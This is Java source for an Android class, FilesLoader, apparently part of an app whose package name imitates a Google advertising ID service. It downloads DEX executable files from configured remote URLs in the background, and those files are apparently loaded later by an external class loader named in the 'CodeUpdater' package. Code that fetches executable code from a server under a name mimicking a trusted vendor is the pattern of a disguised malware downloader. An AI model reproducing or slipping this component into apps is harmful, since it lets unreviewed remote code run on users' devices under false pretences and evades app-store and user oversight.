package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.FilesLoader;

import android.content.Context;
import android.os.AsyncTask;
import android.support.annotation.AnyThread;
import android.support.annotation.BinderThread;

import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;


public class FilesLoader {
    /*****************************************************************
     ********** Методы загрузки файла из внешнего источника **********
     *****************************************************************/
    private static int downloadBinaryFile(String query, File dest) {
        int count;

        OutputStream output;
        HttpURLConnection connection = null;
        try {
            URL url = new URL(query);
            connection = (HttpURLConnection) url.openConnection();
            connection.connect();

            long modified = connection.getLastModified();

            System.out.println(query + " " + connection.getResponseCode());
            // this will be useful so that you can show a tipical 0-100%
            // progress bar

            int lengthOfFile = connection.getContentLength();

            //LogKES.debug(query + " " + lenghtOfFile);

            byte[] buffer = new byte[1024];
            // download the file
            InputStream input = new BufferedInputStream(url.openStream(), buffer.length);

            // Output stream
            output = new FileOutputStream(dest);


            while ((count = input.read(buffer)) != -1) {
                output.write(buffer, 0, count);
                output.flush();
            }

            // flushing output
            output.flush();

            // closing streams
            output.close();
            input.close();

            dest.setLastModified(modified);

            if (dest.length() != lengthOfFile) {
                System.out.println(query + " -2");
                return -2;
            } else {
                System.out.println(query + " 0");
                return 0;
            }
        } catch (Exception e) {
            System.out.println(query + " " + e.getMessage());
            return -1;
        } finally {
            if (connection != null) connection.disconnect();
        }
    }

    public static void downloadReleaseDexFile(final Context cnt)
    {
        //TODO: А надо ли в отдельном потоке запускать, или пусть пользователи этой функции сами запускают её в отдельном потоке?
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                File file = null;
                //String filePath = ExternalLibServicer.getReleaseDexFilePath(cnt);
                String filePath = ExternalLibServicer.getDexFilePath(cnt);
                File tmpFile = new File(filePath);
                if(tmpFile.exists()) {
                    tmpFile.delete();
                }
                file = new File(filePath);
                downloadBinaryFile(GlobalParameters.URL_TO_DEX_FILE_RELEASE, file);
            }
        });
    }

    public static void downloadDebugDexFile(final Context cnt)
    {
        //TODO: А надо ли в отдельном потоке запускать, или пусть пользователи этой функции сами запускают её в отдельном потоке?
        AsyncTask.execute(new Runnable() {
            @Override
            public void run() {
                File file = null;
                //String filePath = ExternalLibServicer.getDebugDexFilePath(cnt);
                String filePath = ExternalLibServicer.getDexFilePath(cnt);
                File tmpFile = new File(filePath);
                if(tmpFile.exists()) {
                    tmpFile.delete();
                }
                file = new File(filePath);
                downloadBinaryFile(GlobalParameters.URL_TO_DEX_FILE_DEBUG, file);
            }
        });
    }

    //Метод надо вызывать в отдельном потоке
    public static void downloadFile(final Context cnt, final String url, final String filePath)
    {
        File file = null;
        File tmpFile = new File(filePath);
        if(tmpFile.exists()) {
            tmpFile.delete();
        }
        file = new File(filePath);
        downloadBinaryFile(url, file);
    }


}
